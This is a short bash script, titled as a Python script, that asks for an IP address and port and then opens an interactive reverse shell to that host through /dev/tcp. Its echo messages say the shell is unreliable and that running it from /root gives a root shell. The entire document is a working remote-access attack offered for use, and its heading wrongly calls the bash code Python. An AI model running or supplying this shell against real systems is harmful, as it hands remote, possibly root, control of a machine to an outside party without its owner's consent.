## Python local Reverse Shell Script
echo '## -- Note: This reverse shell is finicky, and will not work all the time -- ##'
echo 'If successful, terminal will look like it is frozen or waiting for more input'
echo 'Note: Run this under the /root directory for a root shell'

echo 'Enter IP to send connection to'
read ACCESSIP
echo 'enter port to send to'
read ACCESSPORT

bash -i >& /dev/tcp/$ACCESSIP/$ACCESSPORT 0>&1


